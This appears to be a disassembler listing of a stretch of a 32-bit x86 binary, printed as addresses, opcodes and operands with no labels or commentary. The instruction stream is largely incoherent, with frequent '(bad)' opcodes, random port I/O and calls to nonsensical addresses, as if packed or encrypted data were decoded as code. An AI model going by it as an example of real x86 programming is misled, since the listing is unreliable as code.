  4128e7:	fadd   DWORD PTR [ebp-0x2]
  4128ea:	(bad)  
  4128eb:	fnstsw WORD PTR [edi+0x49]
  4128ee:	inc    ecx
  4128ef:	enter  0x43e4,0xf8
  4128f3:	sbb    ebx,DWORD PTR [edx-0xa]
  4128f6:	add    BYTE PTR [edi-0x77fea971],dl
  4128fc:	or     ebp,DWORD PTR [ebx]
  4128fe:	test   BYTE PTR [eax],0xde
  412901:	fidiv  DWORD PTR [ebx-0x8]
  412904:	aaa    
  412905:	add    bl,BYTE PTR [eax-0x74f426b5]
  41290b:	lock xchg ebx,eax
  41290d:	loope  0x412982
  41290f:	add    eax,0x12331
  412914:	pop    eax
  412915:	out    0x54,al
  412917:	or     al,0xe3
  412919:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41291a:	mov    ax,WORD PTR [edx]
  41291d:	imul   eax,DWORD PTR [edi-0x29983b3],0xf8dc0f
  412927:	add    BYTE PTR [eax-0x3c],bl
  41292a:	or     al,0x1
  41292c:	dec    eax
  41292d:	or     ebp,DWORD PTR [eax-0x71]
  412930:	lock dec ebp
  412932:	(bad)  
  412933:	dec    BYTE PTR [edi]
  412935:	ret    
  412936:	xor    al,0x31
  412938:	sbb    BYTE PTR [ebx],cl
  41293a:	or     eax,eax
  41293c:	pop    ss
  41293d:	xchg   edx,eax
  41293e:	repnz add BYTE PTR [eax],cl
  412941:	or     eax,DWORD PTR [ebx+0xf0b007f]
  412947:	test   BYTE PTR [edx-0x78fffff6],ah
  41294d:	arpl   WORD PTR [esi],ax
  41294f:	call   0x3e7afb
  412954:	popa   
  412955:	push   ecx
  412956:	out    dx,al
  412957:	(bad)  
  412958:	jmp    DWORD PTR [edx-0x3]
  41295b:	jne    0x41298e
  41295d:	shl    BYTE PTR [ecx+0x76],0x25
  412961:	enter  0x4607,0x0
  412965:	into   
  412966:	iret   
  412967:	ficomp DWORD PTR [eax-0xfd4ea7]
  41296d:	inc    esp
  41296e:	and    BYTE PTR [ebx-0x3],bl
  412971:	add    DWORD PTR [eax+0x2],esi
  412974:	or     esi,DWORD PTR [ecx+0x5f]
  412977:	xchg   DWORD PTR [ebx+0x6a027031],esi
  41297d:	xor    ebp,ebp
  41297f:	(bad)  
  412980:	out    0x1,eax
  412982:	(bad)
  412985:	loope  0x412a00
  412987:	add    ch,BYTE PTR [edx+0x31]
  41298a:	jle    0x4129fd
  41298c:	adc    al,0xd1
  41298e:	stos   DWORD PTR es:[edi],eax
  41298f:	ret    
  412990:	jmp    FWORD PTR [ebx]
  412992:	xor    BYTE PTR [edx],al
  412994:	test   dh,al
  412996:	jo     0x41299a
  412998:	add    BYTE PTR [ebp+ebp*1-0x3aa1b098],dh
  41299f:	pop    ebx
  4129a0:	(bad)  
  4129a1:	fsub   QWORD PTR [ebx+0x1ad11470]
  4129a7:	ret    
  4129a8:	(bad)  
  4129a9:	cmp    esi,DWORD PTR [eax+0x35ac77f7]
  4129af:	fs dec edi
  4129b1:	retf   
  4129b2:	outs   dx,DWORD PTR ds:[esi]
  4129b3:	fdiv   st(7),st
  4129b5:	cwde   
  4129b6:	ja     0x412994
  4129b8:	jmp    DWORD PTR [edi]
  4129ba:	std    
  4129bb:	inc    BYTE PTR [si+0x14]
  4129bf:	mov    ebp,0x426b3140
  4129c4:	jae    0x412a2d
  4129c6:	(bad)  
  4129c7:	neg    bh
  4129c9:	add    BYTE PTR [ecx],bl
  4129cb:	rdseed esi
  4129ce:	(bad)  
  4129cf:	call   0x2ce6059a
  4129d4:	fs dec edi
  4129d6:	out    dx,al
  4129d7:	or     ah,bl
  4129d9:	dec    edi
  4129da:	pop    eax
  4129db:	or     ebx,edx
  4129dd:	or     BYTE PTR [ebx+0x9],cl
  4129e0:	push   esi
  4129e1:	not    edx
  4129e3:	gs repz out 0x7b,eax
  4129e7:	enter  0xfce8,0x86
  4129eb:	fmul   QWORD PTR [edi]
  4129ed:	fdivr  QWORD PTR [esi-0x484dba9b]
  4129f3:	fneni(8087 only) 
  4129f5:	pop    ebx
  4129f6:	xchg   edi,eax
  4129f8:	and    eax,0xf0dea771
  4129fd:	jo     0x412a23
  4129ff:	or     eax,0x712ef716
  412a04:	or     eax,0x5658fc3
  412a09:	mul    DWORD PTR [esi+0x65]
  412a0c:	jae    0x412a5d
  412a0e:	jg     0x4129eb
  412a10:	loopne 0x412a6d
  412a12:	add    edi,0xdb6f70ed
  412a18:	les    ebx,FWORD PTR [ebx+0x30]
  412a1b:	int3   
  412a1c:	fnsave [eax+0x5f]
  412a1f:	fcmovne st,st(4)
  412a21:	jo     0x412a60
  412a23:	icebp  
  412a24:	and    ebx,eax
  412a26:	dec    esi
  412a27:	out    dx,eax
  412a28:	call   0xbdb5e79d
  412a2d:	push   ss
  412a2e:	add    ch,cl
  412a30:	shl    DWORD PTR [edi],1
  412a32:	add    al,0x36
  412a34:	fstp   TBYTE PTR [eax-0x5a31eba5]
  412a3a:	jo     0x4129ef
  412a3c:	dec    esp
  412a3d:	clc    
  412a3e:	jo     0x412aad
  412a40:	pop    ebp
  412a41:	imul   ebp,esi,0x86de0a22
  412a47:	push   ss
  412a48:	test   DWORD PTR fs:[eax+0x19],esi
  412a4c:	lahf   
  412a4d:	jle    0x412abf
  412a4f:	(bad)  
  412a50:	out    dx,eax
  412a51:	(bad)  
  412a52:	call   0x6f3907d8
  412a57:	inc    edi
  412a58:	test   DWORD PTR [edx-0x58],ecx
  412a5b:	xor    ah,BYTE PTR [esp+esi*2+0x5d]
  412a5f:	popa   
  412a60:	fld    QWORD PTR [edi]
  412a62:	inc    ecx
  412a63:	or     eax,edi
  412a65:	dec    BYTE PTR [esi-0x1f]
  412a68:	(bad)  
  412a69:	enter  0x2e2b,0x9
  412a6d:	push   ebp
  412a6e:	jb     0x412ace
  412a70:	mov    ebx,eax
  412a72:	adc    eax,0x5cfe6339
  412a77:	ja     0x412ad9
  412a79:	dec    edi
  412a7a:	es lahf 
  412a7c:	adc    bh,bh
  412a7e:	aam    0xd8
  412a80:	int3   
  412a81:	inc    eax
  412a82:	jmp    0xe9707a81
  412a87:	xor    dl,BYTE PTR [eax]
  412a89:	shl    dh,0xaf
  412a8c:	mov    bl,0x0
  412a8e:	jmp    0xf18576c5
  412a93:	add    BYTE PTR [ebx],dh
  412a95:	or     DWORD PTR [eax],eax
  412a97:	jmp    0xe734f795
  412a9c:	or     DWORD PTR cs:[eax],eax
  412a9f:	push   ebx
  412aa0:	xor    eax,0x2d42ffef
  412aa5:	out    dx,eax
  412aa6:	call   FWORD PTR [ebx+0x78]
  412aa9:	pop    eax
  412aaa:	dec    edi
  412aab:	je     0x412a65
  412aad:	pop    eax
  412aae:	idiv   BYTE PTR [esi+0x3cfed3ce]
  412ab4:	lds    esp,FWORD PTR [edx+0x74]
  412ab7:	lods   eax,DWORD PTR ds:[esi]
  412ab8:	lea    eax,[esi+0x1032e92f]
  412abe:	rcl    BYTE PTR ds:0xe8717228,0x32
  412ac5:	or     DWORD PTR [eax+0x7b],ebp
  412ac8:	int    0xc8
  412aca:	(bad)  
  412acb:	jmp    FWORD PTR [edi-0x5017f59f]
  412ad1:	dec    ebx
  412ad2:	std    
  412ad3:	call   FWORD PTR [eax]
  412ad5:	loopne 0x412aa5
  412ad7:	lea    edx,[ebp-0x1f]
  412ada:	cmc    
  412adb:	dec    DWORD PTR [edi+0x3d]
  412ade:	push   eax
  412adf:	call   0x3e7703
  412ae4:	push   ecx
  412ae5:	xchg   edx,eax
  412ae6:	(bad)  
  412ae8:	jg     0x412ade
  412aea:	out    0x35,al
  412aec:	xchg   esp,eax
  412aed:	repnz std 
  412aef:	push   0xffffffc8
  412af1:	aas    
  412af2:	ret    
  412af3:	push   0xb5ff0789
  412af8:	add    BYTE PTR [esp+ebx*8],bh
  412afb:	std    
  412afc:	dec    DWORD PTR [edi+0x22]
  412aff:	mov    dh,0x48
  412b01:	leave  
  412b02:	pop    es
  412b03:	call   0xfe33f23d
  412b08:	mov    DWORD PTR ds:0x2ffff5dd,edx
  412b0e:	aas    
  412b0f:	(bad)  
  412b10:	addr16 inc edx
  412b12:	inc    ebp
  412b13:	aas    
  412b14:	add    BYTE PTR [edi-0x60],bh
  412b17:	(bad)  
  412b19:	pop    edi
  412b1a:	repnz std 
  412b1c:	xor    eax,0x3f9fc6
  412b21:	cmp    dl,0x46
  412b24:	(bad)  
  412b25:	jg     0x412b0b
  412b27:	sub    esp,0x67
  412b2a:	repnz std 
  412b2c:	push   0x58
  412b2e:	aas    
  412b2f:	int    0x68
  412b31:	or     DWORD PTR ds:0xda9cb5ff,ecx
  412b37:	std    
  412b38:	(bad)  
  412b39:	fbld   TBYTE PTR [ecx]
  412b3b:	mov    dh,0x48
  412b3d:	pop    ecx
  412b3e:	or     eax,0xf256f9e8
  412b43:	std    
  412b44:	mov    DWORD PTR [ecx],esi
  412b46:	cmc    
  412b47:	pop    edx
  412b48:	test   BYTE PTR [esi],0x94
  412b4b:	fdivr  st,st(7)
  412b4d:	mov    es,WORD PTR [edx+ebx*8-0x481ccec0]
  412b54:	(bad)  
  412b56:	fld    TBYTE PTR [ebp-0x2]
  412b59:	and    al,0x1a
  412b5b:	mov    ebx,0xb8310040
  412b60:	dec    ecx
  412b61:	inc    ebp
  412b62:	faddp  st(3),st
  412b64:	jnp    0x412aea
  412b66:	int    0xc3
  412b68:	ins    DWORD PTR es:[edi],dx
  412b69:	(bad)  
  412b6a:	pop    ebx
  412b6b:	jo     0x412b47
  412b6d:	fcomp  DWORD PTR [ecx-0x4f]
  412b70:	add    bh,bh
  412b72:	test   BYTE PTR [esi+esi*2],al
  412b75:	(bad)  
  412b76:	mov    dh,0x1b
  412b78:	cmp    BYTE PTR [esi-0x17fd4f07],dh
  412b7e:	in     al,0xb2
  412b80:	ins    DWORD PTR es:[edi],dx
  412b81:	(bad)  
  412b82:	test   al,0xed
  412b84:	(bad)  
  412b85:	not    BYTE PTR [esi-0x62437e05]
  412b8b:	sti    
  412b8c:	ins    DWORD PTR es:[edi],dx
  412b8d:	(bad)  
  412b8e:	xor    esp,esp
  412b90:	shl    DWORD PTR [edi+0x31],1
  412b93:	jo     0x412bf2
  412b95:	mov    ebp,0xe7fae576
  412b9a:	sub    esi,DWORD PTR [eax-0x7a990193]
  412ba0:	jae    0x412b98
  412ba2:	pop    esi
  412ba3:	inc    ebx
  412ba4:	ins    BYTE PTR es:[edi],dx
  412ba5:	je     0x412bd0
  412ba7:	dec    eax
  412ba8:	jge    0x412be9
  412baa:	dec    esi
  412bab:	push   ebx
  412bac:	ins    BYTE PTR es:[edi],dx
  412bad:	mov    ah,0x55
  412baf:	mov    ds:0x1d3efe6c,eax
  412bb4:	cld    
  412bb5:	out    0xb1,eax
  412bb7:	xor    BYTE PTR [ebp-0x2],ch
  412bba:	fstp   QWORD PTR cs:[ebx-0xa]
  412bbe:	or     DWORD PTR es:[esi+0x11a5006d],esp
  412bc5:	xchg   ecx,eax
  412bc6:	repnz push esi
  412bc8:	bound  edx,QWORD PTR [ebp-0x6a933a93]
  412bce:	ins    DWORD PTR es:[edi],dx
  412bcf:	pop    es
  412bd0:	(bad)  
  412bd1:	sti    
  412bd2:	sti    
  412bd3:	push   ss
  412bd4:	in     eax,dx
  412bd5:	sub    BYTE PTR [ebp-0x9],ch
  412bd8:	popa   
  412bd9:	cmp    esp,DWORD PTR [edi+eiz*8+0x61]
  412bdd:	ins    DWORD PTR es:[edi],dx
  412bde:	ins    DWORD PTR es:[edi],dx
  412bdf:	pop    ebp
  412be0:	adc    DWORD PTR [ecx-0x2a],edx
  412be3:	push   ds
  412be4:	bound  ebx,QWORD PTR [ebp+0x6d]
  412be7:	popf   
  412be8:	inc    esp
  412be9:	pop    ebp
  412bea:	ins    DWORD PTR es:[edi],dx
  412beb:	iret   
  412bec:	popa   
  412bed:	sar    ebx,cl
  412bef:	into   
  412bf0:	mov    BYTE PTR [esi+0x6d],al
  412bf3:	mov    edi,0xbf507361
  412bf8:	popa   
  412bf9:	xor    eax,0x2dc6585c
  412bfe:	ins    DWORD PTR es:[edi],dx
  412bff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c00:	fwait
  412c01:	sbb    BYTE PTR [ebp-0x61],dh
  412c04:	popa   
  412c05:	adc    BYTE PTR ds:0x6d1561f2,cl
  412c0b:	lds    esi,FWORD PTR [ebp+edx*1+0x6d]
  412c0f:	xchg   DWORD PTR [eax-0x24],esi
  412c12:	sar    BYTE PTR [edi+0x61],0xfd
  412c16:	mov    dh,0x8e
  412c18:	pop    ecx
  412c19:	cmc    
  412c1a:	ins    BYTE PTR es:[edi],dx
  412c1b:	push   esi
  412c1c:	rsm    
  412c1e:	ins    BYTE PTR es:[edi],dx
  412c1f:	addr16 popa 
  412c21:	fwait
  412c22:	addr16 addr16 popa 
  412c25:	fstp   QWORD PTR [ebx+0x0]
  412c28:	push   esp
  412c29:	(bad)  
  412c2a:	aad    0x6c
  412c2c:	dec    edi
  412c2d:	fwait
  412c2e:	enter  0x4774,0x61
  412c32:	shl    BYTE PTR [eax-0x10],1
  412c35:	popa   
  412c36:	mov    ebp,0xff60ed6c
  412c3b:	mov    edi,0xaefe5f12
  412c40:	xchg   ebp,eax
  412c41:	aad    0xfb
  412c43:	xchg   ecx,eax
  412c44:	sbb    eax,0x5be90030
  412c49:	dec    edx
  412c4a:	pop    es
  412c4b:	jmp    0x6b2cc037
  412c50:	outs   dx,BYTE PTR ds:[esi]
  412c51:	fs imul ebp,ecx,0xf4fed1d8
  412c58:	cli    
  412c59:	push   0x5f5c2904
  412c5e:	mov    BYTE PTR [ecx+eiz*2],ah
  412c61:	call   0x6134fe0b
  412c66:	std    
  412c67:	aam    0xda
  412c69:	push   0x5f5d5707
  412c6e:	(bad)  
  412c6f:	aam    0x56
  412c71:	pop    edi
  412c72:	je     0x412c65
  412c74:	pop    edx
  412c75:	xor    BYTE PTR [eax+0x3e],al
  412c78:	inc    ebp
  412c79:	push   ecx
  412c7a:	shr    ebp,0x32
  412c7d:	mov    dh,0x8a
  412c7f:	cmp    eax,0x26f34cb1
  412c84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c85:	adc    al,0xe8
  412c87:	xchg   edi,eax
  412c88:	aaa    
  412c89:	or     DWORD PTR [eax],eax
  412c8b:	loop   0x412c8d
  412c8d:	repnz aam 0x3
  412c90:	and    al,dh
  412c92:	adc    eax,DWORD PTR [eax]
  412c94:	push   es
  412c95:	xchg   DWORD PTR [eax],edx
  412c97:	call   0x4a4423
  412c9c:	loop   0x412c90
  412c9e:	aam    0x3
  412ca0:	and    al,dh
  412ca2:	adc    eax,DWORD PTR [eax]
  412ca4:	jo     0x412d16
  412ca6:	pop    eax
  412ca7:	(bad)  
  412ca8:	push   esp
  412ca9:	lds    esp,FWORD PTR [edi-0x6d]
  412cac:	sub    ebx,edx
  412cae:	pop    esi
  412caf:	mov    BYTE PTR [ecx+ebx*8],ah
  412cb2:	pop    esi
  412cb3:	je     0x412cb5
  412cb5:	je     0x412cab
  412cb7:	jae    0x412cb1
  412cb9:	ja     0x412d15
  412cbb:	push   cs
  412cbc:	call   0x3ecf75
  412cc1:	adc    ecx,esp
  412cc3:	jb     0x412d00
  412cc5:	mov    eax,ds:0x86af24a
  412cca:	loope  0x412d0f
  412ccc:	hlt    
  412ccd:	dec    eax
  412cce:	hlt    
  412ccf:	jae    0x412ccd
  412cd1:	mov    al,0xb8
  412cd3:	imul   edi,edi,0x74be5fb7
  412cd9:	out    dx,al
  412cda:	inc    ebx
  412cdb:	dec    BYTE PTR [edi]
  412cdd:	mov    bh,0xb2
  412cdf:	std    
  412ce0:	jne    0x412cb2
  412ce2:	ret    
  412ce3:	cmc    
  412ce4:	ds push edi
  412ce6:	hlt    
  412ce7:	std    
  412ce8:	jne    0x412cae
  412cea:	bnd jae 0x412cf5
  412ced:	jo     0x412c92
  412cef:	cmp    eax,0xf47700ff
  412cf4:	jae    0x412cea
  412cf6:	ja     0x412d52
  412cf8:	cli    
  412cf9:	(bad)  
  412cfa:	jge    0x412d5f
  412cfc:	out    0x14,al
  412cfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412cff:	repnz std 
  412d01:	(bad)  
  412d02:	fucom  st(7)
  412d04:	out    0x25,al
  412d06:	retf   0xfdf2
  412d09:	leave  
  412d0a:	dec    edx
  412d0b:	popa   
  412d0c:	(bad)  
  412d0d:	push   esp
  412d0e:	adc    eax,ecx
  412d10:	add    esp,0x75fd3b3c
  412d16:	test   bl,al
  412d18:	in     eax,dx
  412d19:	inc    esi
  412d1a:	ja     0x412d0e
  412d1c:	or     eax,eax
  412d1e:	in     eax,dx
  412d1f:	or     BYTE PTR [esi-0x37],bl
  412d22:	sbb    ah,BYTE PTR [ecx-0x2]
  412d25:	mov    WORD PTR ds:0xfdff4ed5,cs
  412d2b:	pusha  
  412d2c:	out    0xa1,al
  412d2e:	xor    DWORD PTR [edi],ebp
  412d30:	imul   edi,esi,0x3a
  412d33:	mov    dl,0xf9
  412d35:	adc    DWORD PTR [ecx+0x71],0x2
  412d39:	add    BYTE PTR [esi],dh
  412d3b:	adc    al,0x68
  412d3d:	out    0x35,eax
  412d3f:	xor    ch,BYTE PTR [ebx-0x2]
  412d42:	mov    eax,0xa4fe5825
  412d47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d48:	imul   esi,DWORD PTR [ebp+eax*1-0x80],0x4b19f7ef
  412d50:	(bad)  
  412d51:	inc    BYTE PTR [esi]
  412d53:	in     al,dx
  412d54:	out    dx,eax
  412d55:	jmp    0x412d57
  412d57:	or     ah,dl
  412d59:	add    al,BYTE PTR [eax]
  412d5b:	xor    eax,edi
  412d5d:	add    al,0x69
  412d5f:	jo     0x412dd1
  412d61:	shl    bh,1
  412d63:	jbe    0x412d03
  412d65:	add    al,BYTE PTR [eax]
  412d67:	sub    dh,BYTE PTR [eax]
  412d69:	lock add al,0xc8
  412d6c:	mov    BYTE PTR [edx],al
  412d6e:	add    BYTE PTR [ecx],dh
  412d70:	jmp    0x412de4
  412d72:	xor    BYTE PTR [bx+di-0x3d],cl
  412d76:	call   esi
  412d78:	ficom  DWORD PTR [esi]
  412d7a:	add    BYTE PTR [ecx],dh
  412d7c:	jae    0x412df0
  412d7e:	mov    BYTE PTR [eax+ecx*8],ah
  412d81:	ficom  DWORD PTR [eax]
  412d83:	sbb    BYTE PTR [ecx+0x3a895602],dh
  412d89:	sbb    BYTE PTR [eax],al
  412d8b:	xor    DWORD PTR [ebx+0x42],ebx
  412d8e:	je     0x412dc3
  412d90:	or     esi,ecx
  412d92:	mov    DWORD PTR [ecx],esp
  412d94:	call   0xadea1068
  412d99:	pop    esi
  412d9a:	and    bh,BYTE PTR [bx+di-0x3d]
  412d9e:	inc    DWORD PTR [eax+ecx*1]
  412da1:	adc    al,0x2e
  412da3:	xor    DWORD PTR [eax-0x3],esi
  412da6:	mov    edi,0x5ceb08e4
  412dab:	cmc    
  412dac:	xchg   ecx,eax
  412dad:	fcomp  st(4)
  412daf:	and    esi,eax
  412db1:	daa    
  412db2:	add    al,0x59
  412db4:	into   
  412db5:	cld    
  412db6:	add    esi,DWORD PTR [ecx]
  412db8:	or     bh,BYTE PTR [ecx+0x3cbd007b]
  412dbe:	push   eax
  412dbf:	adc    ebx,DWORD PTR [eax+0xed1e8c8]
  412dc5:	outs   dx,BYTE PTR ds:[esi]
  412dc6:	sti    
  412dc7:	add    esi,DWORD PTR [ecx]
  412dc9:	adc    ch,BYTE PTR [ecx-0x1e8dcf11]
  412dcf:	jge    0x412e0f
  412dd1:	xchg   ecx,eax
  412dd2:	cmp    edx,DWORD PTR [ecx-0x47]
  412dd5:	ret    
  412dd6:	mov    al,0x7d
  412dd8:	jne    0x412e3f
  412dda:	scas   al,BYTE PTR es:[edi]
  412ddb:	add    al,0x31
  412ddd:	xchg   edx,eax
  412dde:	and    ecx,DWORD PTR [esp+esi*8+0x8]
  412de2:	jmp    0x6d7e8b4f
  412de7:	out    dx,eax
  412de8:	(bad)  
  412de9:	pop    ebp
  412dea:	(bad)  
  412dec:	into   
  412ded:	jns    0x412e4d
  412def:	imul   ecx,edi,0xbb64bb92
  412df5:	ret    
  412df6:	inc    esp
  412df7:	jl     0x412e27
  412df9:	xchg   ebx,eax
  412dfa:	fwait
  412dfb:	push   eax
  412dfc:	stos   DWORD PTR es:[edi],eax
  412dfd:	ret    
  412dfe:	and    BYTE PTR [esi+edi*1-0x77],bh
  412e02:	test   BYTE PTR [ebx],0x36
  412e05:	test   BYTE PTR [eax+ebp*2-0x10daa261],dl
  412e0c:	mov    dh,BYTE PTR [eax-0x38]
  412e0f:	ret    0x5d8f
  412e12:	arpl   WORD PTR [edi-0x46ff476a],di
  412e18:	neg    DWORD PTR [ebp+0x5]
  412e1b:	pop    ebp
  412e1c:	jbe    0x412dd9
  412e1e:	das    
  412e1f:	inc    esi
  412e20:	add    BYTE PTR [edx],bh
  412e22:	or     DWORD PTR [eax],eax
  412e24:	pushf  
  412e25:	in     eax,0x71
  412e27:	(bad)  
  412e28:	je     0x412e90
  412e2a:	gs pop esp
  412e2c:	sub    al,0xc8
  412e2e:	pop    esi
  412e2f:	or     ch,BYTE PTR [ecx-0x3297cfa2]
  412e35:	push   0xffffffc8
  412e37:	(bad)  
  412e38:	cmp    ch,bl
  412e3a:	jo     0x412e7f
  412e3c:	(bad)  
  412e3d:	leave  
  412e3e:	int    0x67
  412e40:	sbb    DWORD PTR ds:[eax+eax*1],0x41
  412e45:	sub    eax,0xfa6fef09
  412e4a:	push   ebp
  412e4b:	sub    BYTE PTR [di],ch
  412e4e:	mov    ecx,0x650d14fe
  412e53:	and    eax,DWORD PTR [ecx]
  412e55:	cwde   
  412e56:	pop    ebx
  412e57:	out    0xb1,eax
  412e59:	repnz pop ebx
  412e5b:	(bad)  
  412e5c:	mov    al,0x6c
  412e5e:	add    al,0x0
  412e60:	adc    al,0x6c
  412e62:	jo     0x412de6
  412e64:	lods   eax,DWORD PTR ds:[esi]
  412e65:	dec    esi
  412e66:	repnz inc DWORD PTR [edx]
  412e69:	lahf   
  412e6a:	pop    ebx
  412e6b:	je     0x412e5e
  412e6d:	jp     0x412ed1
  412e6f:	cmp    al,0x5e
  412e71:	pop    ecx
  412e72:	xchg   ecx,eax
  412e73:	inc    esp
  412e74:	push   ebp
  412e75:	in     al,0x2
  412e77:	call   esp
  412e79:	mov    edx,0x4946a464
  412e7e:	pop    ebx
  412e7f:	imul   ecx,DWORD PTR [edx],0x4107d518
  412e85:	add    BYTE PTR [ebp+0x7c2efe5b],dh
  412e8b:	add    bh,bh
  412e8d:	pushf  
  412e8e:	call   0x675b:0x191e9064
  412e95:	jmp    0x81fe9acc
  412e9a:	(bad)  
  412e9c:	inc    eax
  412e9d:	add    BYTE PTR [eax-0x66971dc0],cl
  412ea3:	or     bh,bh
  412ea5:	jne    0x412ef7
  412ea7:	rol    ch,0x69
  412eaa:	dec    edi
  412eab:	in     al,0xfd
  412ead:	jne    0x412efb
  412eaf:	in     al,0x73
  412eb1:	or     BYTE PTR [eax-0xe],ah
  412eb4:	cmp    edi,edi
  412eb6:	pop    edi
  412eb7:	push   ds
  412eb8:	rol    DWORD PTR [eax+ecx*2],0x39
  412ebc:	mov    esp,ebp
  412ebe:	leave  
  412ebf:	enter  0xf7d6,0xef
  412ec3:	jecxz  0x412e50
  412ec5:	inc    ebp
  412ec6:	fdiv   QWORD PTR [edi*8+0x73e2fc75]
  412ecd:	or     al,al
  412ecf:	jns    0x412efb
  412ed1:	add    BYTE PTR [eax],bl
  412ed3:	pop    edi
  412ed4:	mov    esi,0xffc5950f
  412ed9:	dec    DWORD PTR [eax]
  412edb:	sbb    eax,DWORD PTR [eax+edi*8+0x8]
  412edf:	or     BYTE PTR [eax],al
  412ee1:	add    BYTE PTR [edi-0x28000db7],dl
  412ee7:	pop    es
  412ee8:	add    BYTE PTR [edx+0x0],ch
  412eeb:	enter  0xfe41,0x69
  412eef:	enter  0xfe41,0x8c
  412ef3:	xchg   ebp,eax
  412ef4:	jmp    0x412f44
  412ef6:	lea    edx,[ebp-0x27]
  412ef9:	cmc    
  412efa:	jmp    FWORD PTR [edi+0x35]
  412efd:	std    
  412efe:	jne    0x412f70
  412f00:	in     al,0x73
  412f02:	cld    
  412f03:	add    BYTE PTR [edx+ebp*1],bh
  412f06:	add    BYTE PTR [eax-0x6a8b41a2],bl
  412f0c:	mov    esp,0x7880181
  412f11:	push   0xfe44c092
  412f16:	(bad)  
  412f17:	xor    DWORD PTR [ebp-0xa],edi
  412f1a:	out    0xb9,eax
  412f1c:	scas   al,BYTE PTR es:[edi]
  412f1d:	gs (bad) 
  412f1f:	loope  0x412ef7
  412f21:	push   ebx
  412f22:	mov    WORD PTR [ebp+edx*2-0x7e990193],?
  412f29:	shl    bh,1
  412f2b:	mov    DWORD PTR [esi-0x1357019b],ebp
  412f31:	dec    edx
  412f32:	test   BYTE PTR [esi+0x3a],0x5a
  412f36:	std    
  412f37:	push   es
  412f38:	xor    esp,DWORD PTR [ebp+0x69]
  412f3b:	xor    edx,ecx
  412f3d:	es imul esi,eax,0x9b46571
  412f44:	xchg   esp,eax
  412f45:	gs (bad) 
  412f47:	es push ds
  412f49:	cld    
  412f4a:	out    0x30,eax
  412f4c:	das    
  412f4d:	inc    BYTE PTR [bx+si]
  412f50:	test   al,0xed
  412f52:	jb     0x412f4a
  412f54:	push   cs
  412f55:	jl     0x412f2f
  412f57:	dec    DWORD PTR [esi+0x3140dd28]
  412f5d:	mov    ebp,DWORD PTR [edi+0x6583fed7]
  412f63:	(bad)  
  412f64:	fs pop eax
  412f66:	pop    edx
  412f67:	in     eax,0x73
  412f69:	shl    DWORD PTR [ebp-0x78],cl
  412f6c:	mov    ah,0xdc
  412f6e:	ins    DWORD PTR es:[edi],dx
  412f6f:	(bad)  
  412f70:	(bad)  
  412f71:	add    ch,BYTE PTR ss:[eax+0x60]
  412f75:	cmp    ebx,eax
  412f77:	inc    edi
  412f79:	jge    0x412fc5
  412f7b:	idiv   BYTE PTR [esi+0x297465cb]
  412f81:	mov    eax,0x1bae4139
  412f86:	jl     0x412f0c
  412f88:	cdq    
  412f89:	sbb    esp,DWORD PTR [esi-0x2]
  412f8c:	lods   al,BYTE PTR ds:[esi]
  412f8d:	in     eax,0x46
  412f8f:	not    BYTE PTR [esi+0x16d32609]
  412f95:	mov    edi,0x5b86c48f
  412f9a:	pop    ebx
  412f9b:	dec    ebx
  412f9c:	xchg   DWORD PTR [edx+0xd],ebx
  412f9f:	data16 std 
  412fa1:	adc    BYTE PTR [ecx],dl
  412fa3:	call   0x65ad:0x7bfd59f0
  412faa:	std    
  412fab:	gs pop edi
  412fad:	out    dx,eax
  412fae:	call   0x2830fd8e
  412fb3:	add    al,0x0
  412fb5:	dec    esi
  412fb6:	xchg   esp,eax
  412fb7:	shr    BYTE PTR [ebp+0x47],0x5a
  412fbb:	aad    0xef
  412fbd:	ss jno 0x413038
  412fc0:	ret    0x5a37
  412fc3:	outs   dx,DWORD PTR ds:[esi]
  412fc4:	jg     0x412fd4
  412fc6:	push   edx
  412fc7:	mov    ebp,0xb89bb365
  412fcc:	ins    DWORD PTR es:[edi],dx
  412fcd:	pop    ds
  412fce:	pop    edx
  412fcf:	call   0x63c7bbc3
  412fd4:	pop    eax
  412fd5:	pop    es
  412fd6:	pop    edx
  412fd7:	popf   
  412fd8:	add    al,0x7d
  412fda:	out    0x69,eax
  412fdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412fdd:	push   ss
  412fde:	push   edx
  412fdf:	lea    esp,[ebp-0xa]
  412fe2:	aad    0x1f
  412fe4:	fsub   st(6),st
  412fe6:	pop    ecx
  412fe7:	lea    esp,[esi+0x5bd8d3e7]
  412fed:	fistp  DWORD PTR ds:0x93d7656e
  412ff3:	pop    eax
  412ff4:	ins    DWORD PTR es:[edi],dx
  412ff5:	iret   
  412ff6:	pop    ecx
  412ff7:	pop    ebp
  412ff8:	out    dx,eax
  412ff9:	ss jno 0x412fa1
  412ffc:	daa    
  412ffd:	mov    esi,0xcaaf4d59
  413002:	push   ecx
  413003:	inc    ebp
  413004:	gs scas eax,DWORD PTR es:[edi]
  413006:	rcr    eax,cl
  413008:	pop    ebx
  413009:	icebp  
  41300a:	sbb    al,0x0
  41300c:	ss adc al,0x5b
  41300f:	mov    ah,0x41
  413011:	add    al,0x5b
  413013:	(bad)  
  413014:	es sahf 
  413016:	or     eax,ebp
  413018:	fiadd  DWORD PTR [eax]
  41301a:	dec    esi
  41301b:	pop    edx
  41301c:	(bad)  
  41301d:	push   ss
  41301e:	into   
  41301f:	cmp    eax,0x5b0c0ef6
  413024:	mov    ah,0xd
  413026:	fcomp  QWORD PTR [edx-0x2]
  413029:	(bad)  
  41302a:	push   edi
  41302b:	or     eax,ebp
  41302d:	cli    
  41302e:	or     DWORD PTR [edx-0x2],ebx
  413031:	out    dx,al
  413032:	xchg   DWORD PTR [ecx],edi
  413034:	mul    dh
  413036:	aad    0x5a
  413038:	je     0x413033
  41303a:	jmp    0x745a:0xd5d63bf8
  413041:	stc    
  413042:	int    0x94
  413044:	xlat   BYTE PTR ds:[ebx]
  413045:	mov    esi,0x34fe5795
  41304a:	and    eax,0x95b77171
  41304f:	push   edi
  413050:	(bad)  
  413051:	je     0x4130bd
  413053:	pop    edi
  413054:	(bad)  
  413055:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413056:	push   0x6a
  413058:	cmp    eax,0xb4578d9e
  41305d:	cdq    
  41305e:	lea    edx,[edi-0x2]
  413061:	and    DWORD PTR [ebp+0x16],0x9d5586ff
  413068:	jmp    0x4130e0
